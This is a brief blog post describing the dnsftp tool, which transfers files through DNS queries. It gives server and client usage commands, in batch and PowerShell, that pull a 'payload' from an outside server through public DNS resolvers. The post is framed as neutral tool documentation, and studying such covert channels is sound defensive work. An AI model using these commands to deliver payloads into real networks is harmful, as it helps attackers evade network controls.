---
title: Transfer files via DNS
date: 2016-12-11 00:24:05
tags: DNS
---

[Download](https://github.com/breenmachine/dnsftp)

### Usage
Server

```
> sudo python server.py -f /path/to/file
```
Client

```
> runme.bat payloadserverhostname fileparts publicdnsserver
or 
> powershell client.ps1 -server where.your.server.resolves.com
```
Example: 
    
    runme.bat payloadserver.yourdomain.com 42 8.8.8.8
If just testing internally, you can use the following example:

    runme.bat payloadserverhostname fileparts payloadserverIPaddr